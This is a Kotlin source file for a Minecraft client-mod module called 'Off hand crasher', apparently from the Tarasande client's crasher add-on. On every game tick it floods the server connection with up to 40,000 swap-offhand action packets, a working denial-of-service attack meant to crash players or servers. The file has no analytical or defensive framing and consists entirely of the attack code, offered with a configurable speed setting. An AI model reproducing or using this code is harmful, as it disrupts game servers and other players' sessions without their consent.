package de.florianmichael.tarasande_crasher.module

import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket
import net.minecraft.util.math.BlockPos
import net.minecraft.util.math.Direction
import net.tarasandedevelopment.tarasande.event.EventDisconnect
import net.tarasandedevelopment.tarasande.event.EventUpdate
import net.tarasandedevelopment.tarasande.mc
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueNumber
import net.tarasandedevelopment.tarasande.system.feature.modulesystem.Module

class ModuleOffHandCrasher : Module("Off hand crasher", "Crashing players with spamming the off hand", "Crasher") {

    private val packet = PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos(0, 0, 0), Direction.UP)
    private val speed = ValueNumber(this, "Speed", 100.0, 10000.0, 40000.0, 500.0)

    init {
        registerEvent(EventDisconnect::class.java) {
            switchState()
        }
        registerEvent(EventUpdate::class.java) {
            if (it.state == EventUpdate.State.POST) {
                for (i in 0 until speed.value.toInt()) {
                    mc.networkHandler!!.connection.channel.write(packet)
                }
                mc.networkHandler!!.connection.channel.flush()
            }
        }
    }
}
